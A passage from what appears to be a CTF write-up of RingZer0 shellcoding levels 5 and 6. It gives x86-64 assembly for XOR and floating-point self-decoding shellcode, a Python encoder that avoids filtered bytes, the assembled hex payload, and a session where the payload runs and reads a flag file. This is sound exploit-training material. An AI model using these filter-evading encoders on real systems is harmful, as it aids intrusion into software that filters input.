</span><span class='line'><span class="s">;mov rsi, 0x1000</span>
</span><span class='line'><span class="s">;mov rdx, 7</span>
</span><span class='line'><span class="s">;syscall</span>
</span><span class='line'><span class="s">;lea rax, [_decoder]</span>
</span><span class='line'>
</span><span class='line'><span class="s">_shellcode:</span>
</span><span class='line'><span class="s">jmp _decoder</span>
</span><span class='line'><span class="s">&quot;&quot;&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="n">defines</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;_decoder:&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="n">commands</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;jmp _shellcode0&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This output the encoded shellcode as an assembly file. Using <code>nasm</code>, I could build it into shellcode again. For local testing, I included a call to <code>mprotect</code> and set the value of <code>rax</code> to the start of the shellcode, just like the situation on the remote server. The layout of the built shellcode (first encrypted bytes, then the decoder) is done on purpose: it avoids bad chars in the <code>xor dword [rax+offset]</code> instructions. The value for the offset should not be too high, as that would introduce bytes in the range <code>0x40</code> to <code>0x65</code>&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bits</span> <span class="mi">64</span>
</span><span class='line'><span class="n">_start</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'><span class="p">;</span><span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="mi">10</span>
</span><span class='line'><span class="p">;</span><span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="mh">0x400000</span>
</span><span class='line'><span class="p">;</span><span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="mh">0x1000</span>
</span><span class='line'><span class="p">;</span><span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="mi">7</span>
</span><span class='line'><span class="p">;</span><span class="n">syscall</span>
</span><span class='line'><span class="p">;</span><span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">_decoder</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">_shellcode</span><span class="p">:</span>
</span><span class='line'><span class="n">jmp</span> <span class="n">_decoder</span>
</span><span class='line'><span class="n">_shellcode0</span> <span class="n">dd</span> <span class="mh">0x70d02169</span>
</span><span class='line'><span class="n">_shellcode1</span> <span class="n">dd</span> <span class="mh">0x7a7e747f</span>
</span><span class='line'><span class="n">_shellcode2</span> <span class="n">dd</span> <span class="mh">0x151f7a6f</span>
</span><span class='line'><span class="n">_shellcode3</span> <span class="n">dd</span> <span class="mh">0x976912a0</span>
</span><span class='line'><span class="n">_shellcode4</span> <span class="n">dd</span> <span class="mh">0x69151fe7</span>
</span><span class='line'><span class="n">_shellcode5</span> <span class="n">dd</span> <span class="mh">0x1f866987</span>
</span><span class='line'><span class="n">_shellcode6</span> <span class="n">dd</span> <span class="mh">0x7011a015</span>
</span><span class='line'><span class="n">_shellcode7</span> <span class="n">dd</span> <span class="mh">0xd3151f7f</span>
</span><span class='line'>
</span><span class='line'><span class="n">_decoder</span><span class="p">:</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode0</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x20101021</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode1</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x10202020</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode2</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x10102010</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode3</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x10211010</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode4</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x21101010</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode5</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x10102110</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode6</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x20101010</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode7</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x10101020</span>
</span><span class='line'>
</span><span class='line'><span class="n">jmp</span> <span class="n">_shellcode0</span>
</span></code></pre></td></tr></table></div></figure>


<p>Feeling quite chuffed, I assembled it and checked for bad chars&hellip; there was one! A <code>0x0a</code> byte snuck in. This was because the addresses of the encoded dwords were, relative to <code>rax</code>: 2, 6, 10, 14, etc. I needed to add an offset, which I did:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">_shellcode</span><span class="p">:</span>
</span><span class='line'><span class="n">jmp</span> <span class="n">_decoder</span>
</span><span class='line'><span class="n">nop</span>
</span><span class='line'><span class="n">nop</span>
</span></code></pre></td></tr></table></div></figure>


<p>This took care of the problem. Yes, this shellcode could have been shorter, probably. A lot of the constants look similar, so I could have probably made the decoder smaller by selecting a &lsquo;magic&rsquo; constant. However, it worked!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span><span class="p">;</span> nasm -f bin ./completed2.asm<span class="p">;</span> xxd -c <span class="m">1</span> ./completed2 <span class="p">|</span> awk <span class="s1">&#39;{print &quot;\\x&quot;$2 }&#39;</span> <span class="p">|</span>tr -d <span class="s1">&#39;\n&#39;</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> wc -c ./completed2
</span><span class='line'>
</span><span class='line'><span class="se">\x</span>eb<span class="se">\x</span>22<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>69<span class="se">\x</span>21<span class="se">\x</span>d0<span class="se">\x</span>70<span class="se">\x</span>7f<span class="se">\x</span>74<span class="se">\x</span>7e<span class="se">\x</span>7a<span class="se">\x</span>6f<span class="se">\x</span>7a<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>a0<span class="se">\x</span>12<span class="se">\x</span>69<span class="se">\x</span>97<span class="se">\x</span>e7<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>69<span class="se">\x</span>87<span class="se">\x</span>69<span class="se">\x</span>86<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>a0<span class="se">\x</span>11<span class="se">\x</span>70<span class="se">\x</span>7f<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>d3<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>04<span class="se">\x</span>21<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>20<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>08<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>0c<span class="se">\x</span>10<span class="se">\x</span>20<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>21<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>14<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>21<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>18<span class="se">\x</span>10<span class="se">\x</span>21<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>1c<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>20<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>eb<span class="se">\x</span>a6
</span><span class='line'><span class="m">94</span> ./completed2
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>ssh level5@shellcode.ringzer0team.com -p 7771level5@shellcode.ringzer0team.com<span class="err">&#39;</span>s password:
</span><span class='line'>Linux ld64deb1 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
</span><span class='line'>Last login: Thu Feb  <span class="m">5</span> 17:23:29 <span class="m">2015</span> from 137.224.219.201
</span><span class='line'>
</span><span class='line'>RingZer0 Team CTF Shellcoding Level 5
</span><span class='line'>Submit your shellcode using hex representation <span class="s2">&quot;\xcc\xcd&quot;</span>.
</span><span class='line'>Type <span class="s2">&quot;end&quot;</span> to exit.
</span><span class='line'>
</span><span class='line'>This level have shellcode restriction. Bad char list <span class="s2">&quot;\x0a\x0d\x2f\xff\x0f\x05\x68 and \x40 to \x65&quot;</span> max size <span class="m">100</span> bytes.
</span><span class='line'>You main goal is to <span class="nb">read</span> /flag/level5.flag
</span><span class='line'>
</span><span class='line'>shellcode&gt;<span class="se">\x</span>eb<span class="se">\x</span>22<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>69<span class="se">\x</span>21<span class="se">\x</span>d0<span class="se">\x</span>70<span class="se">\x</span>7f<span class="se">\x</span>74<span class="se">\x</span>7e<span class="se">\x</span>7a<span class="se">\x</span>6f<span class="se">\x</span>7a<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>a0<span class="se">\x</span>12<span class="se">\x</span>69<span class="se">\x</span>97<span class="se">\x</span>e7<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>69<span class="se">\x</span>87<span class="se">\x</span>69<span class="se">\x</span>86<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>a0<span class="se">\x</span>11<span class="se">\x</span>70<span class="se">\x</span>7f<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>d3<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>04<span class="se">\x</span>21<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>20<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>08<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>0c<span class="se">\x</span>10<span class="se">\x</span>20<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>21<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>14<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>21<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>18<span class="se">\x</span>10<span class="se">\x</span>21<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>1c<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>20<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>eb<span class="se">\x</span>a6
</span><span class='line'>  Shellcode received...
</span><span class='line'>  Shellcode length <span class="o">(</span>94<span class="o">)</span> bytes.
</span><span class='line'>
</span><span class='line'>  Success: Executing shellcode...
</span><span class='line'>
</span><span class='line'>/flag/level5.flag^@
</span><span class='line'>FLAG-&lt;redacted&gt;
</span><span class='line'>  Error: SIGSEGV received I think your shellcode is not working.
</span></code></pre></td></tr></table></div></figure>


<h2>Level 6</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Bad char list <span class="s2">&quot;\x0a\x0d\x2f\xff\x0f\x05\x68 and \x40 to \x81&quot;</span> max size <span class="m">90</span> bytes.
</span></code></pre></td></tr></table></div></figure>


<p>Things are beginning to look grim! Every time I came up with a solution, the next level would list one or more crucial bytes as a bad char. This time, <code>0x81</code> became a bad char, blocking the use of the <code>xor</code>.</p>

<p>I turned again to the gigantic table over at <a href="http://ref.x86asm.net/coder64.html">ref.x64asm.net</a>. I flipped through the list of available opcodes, looking for things that would allow me to decode and carve out the shellcode. Finally, my eyes caught the floating point instructions. One of the variants allows the use of integers as arguments for floating point operations:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>fild dword <span class="o">[</span>rax+rbx*4<span class="o">]</span>
</span><span class='line'>fiadd dword <span class="o">[</span>rax+rcx*4<span class="o">]</span>
</span><span class='line'>fistp dword <span class="o">[</span>rax+rcx*4<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>These instructions do not contain bad chars! Furthermore, they allow the use of <code>rax</code> as a pointer to the shellcode, enabling us to carve out stage 1. I used a similar trick as in level 5 to check the viability of this technique:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>_start:
</span><span class='line'>jmp _decode
</span><span class='line'>nop
</span><span class='line'>nop                     <span class="p">;</span> align the encoded shellcode to a dword boundary
</span><span class='line'>
</span><span class='line'>_stage1:
</span><span class='line'>
</span><span class='line'>_0 dd 0xc3c3c3c3        <span class="p">;</span> these rets should be transformed into jmp <span class="nv">$-</span>2
</span><span class='line'>_1 dd 0x90909090
</span><span class='line'>_2 dd 0x90909090
</span><span class='line'>_3 dd 0x90909090
</span><span class='line'>_4 dd 0x90909090
</span><span class='line'>_5 dd 0x90909090
</span><span class='line'>_6 dd 0x90909090
</span><span class='line'>
</span><span class='line'>_8 dd 0x3b283b28        <span class="p">;</span> funny enough, the constant <span class="k">for</span> the add is the same as <span class="k">for</span> the xor!
</span><span class='line'>_9 dd 0x90909090
</span><span class='line'>_a dd 0x90909090
</span><span class='line'>_b dd 0x90909090
</span><span class='line'>_c dd 0x90909090
</span><span class='line'>_d dd 0x90909090
</span><span class='line'>_e dd 0x90909090
</span><span class='line'>
</span><span class='line'>_decode:                <span class="p">;</span> i<span class="err">&#39;</span>d call this stage 0
</span><span class='line'>xor ecx,ecx             <span class="p">;</span> clear ecx and rcx
</span><span class='line'>xor ebx,ebx             <span class="p">;</span> clear ebx
</span><span class='line'>mov cl, <span class="o">(</span>_6-_start<span class="o">)</span>/4   <span class="p">;</span> starting dword <span class="k">for</span> shellcode
</span><span class='line'>mov bl, <span class="o">(</span>_e-_start<span class="o">)</span>/4   <span class="p">;</span> starting dword <span class="k">for</span> decoding constants
</span><span class='line'>_decodeloop:
</span><span class='line'>fild dword <span class="o">[</span>rax+rbx*4<span class="o">]</span>  <span class="p">;</span> load integer into st0
</span><span class='line'>dec bl
</span><span class='line'>fiadd dword <span class="o">[</span>rax+rcx*4<span class="o">]</span> <span class="p">;</span> add constant to st0
</span><span class='line'>fistp dword <span class="o">[</span>rax+rcx*4<span class="o">]</span> <span class="p">;</span> store integer at this position, effectively decoding the instructions
</span><span class='line'>loop _decodeloop        <span class="p">;</span> use the fact that rcx is now an index and a counter
</span><span class='line'>
</span><span class='line'>jmp _stage1             <span class="p">;</span> jump to -hopefully- decoded shellcode
</span></code></pre></td></tr></table></div></figure>


<p>Again, this hangs the remote program, confirming that this is a viable technique. I adjusted <code>encode.py</code> to generate the right constants. Prepare for some ultra-hacky python:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">carry</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">def</span> <span class="nf">find_sub_bytes</span><span class="p">(</span><span class="n">byte_required</span><span class="p">):</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">carry</span>
</span><span class='line'>  <span class="n">b</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">byte_required</span><span class="p">)</span> <span class="o">-</span> <span class="n">carry</span> <span class="c"># compensate for possible carry from previously encoded byte</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">i</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">:</span>
</span><span class='line'>          <span class="n">c</span> <span class="o">=</span> <span class="n">b</span> <span class="o">-</span> <span class="n">i</span>
</span><span class='line'>          <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">:</span>
</span><span class='line'>              <span class="n">carry</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>              <span class="k">if</span> <span class="n">c</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>                  <span class="n">carry</span> <span class="o">=</span> <span class="mi">1</span> <span class="c"># this carry is necessary, because the if the byte overflows, it is carried over to the next byte. </span>
</span><span class='line'>              <span class="c"># return the two bytes that encode the required byte</span>
</span><span class='line'>              <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;cannot find proper byte for {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>  <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'><span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">]</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">):</span>
</span><span class='line'>  <span class="n">badchars</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'><span class="c"># paranoia!</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x1</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">):</span>
</span><span class='line'>  <span class="n">badchars</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;shellcode&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">sc</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">sc</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>  <span class="n">sc</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">storage</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">encoded_bytes</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">commands</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">defines</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">num_commands</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x8f</span><span class="s">&quot;</span>
</span><span class='line'>  
</span><span class='line'><span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>  <span class="p">(</span><span class="n">b1</span><span class="p">,</span> <span class="n">b2</span><span class="p">)</span> <span class="o">=</span> <span class="n">find_sub_bytes</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">storage</span> <span class="o">+=</span> <span class="n">b1</span>
</span><span class='line'>  <span class="n">encoded_bytes</span> <span class="o">+=</span> <span class="n">b2</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">storage</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span><span class='line'>      <span class="c"># emit</span>
</span><span class='line'>      <span class="n">carry</span> <span class="o">=</span> <span class="mi">0</span> <span class="c"># clear carry, not necessary for next dword!</span>
</span><span class='line'>      <span class="n">commands</span> <span class="o">+=</span> <span class="s">&quot;_a{} dd {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num_commands</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">storage</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
</span><span class='line'>      <span class="n">defines</span> <span class="o">+=</span> <span class="s">&quot;_b{} dd {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num_commands</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">encoded_bytes</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
</span><span class='line'>      <span class="n">storage</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>      <span class="n">encoded_bytes</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>      <span class="n">num_commands</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>                  
</span><span class='line'><span class="k">print</span> <span class="s">&quot;&quot;&quot;default rel</span>
</span><span class='line'><span class="s">bits 64</span>
</span><span class='line'>
</span><span class='line'><span class="s">;mov rax, 10</span>
</span><span class='line'><span class="s">;mov rdi, 0x400000</span>
</span><span class='line'><span class="s">;mov rsi, 0x1000</span>
</span><span class='line'><span class="s">;mov rdx, 7</span>
</span><span class='line'><span class="s">;syscall</span>
</span><span class='line'>
</span><span class='line'><span class="s">;lea rax, [_start]</span>
</span><span class='line'>
</span><span class='line'><span class="s">_start:</span>
</span><span class='line'><span class="s">_stage0:              ; stage0 will carve out stage1 </span>
</span><span class='line'><span class="s">xor ecx,ecx</span>
</span><span class='line'><span class="s">jmp _decoder</span>
</span><span class='line'><span class="s">&quot;&quot;&quot;</span>
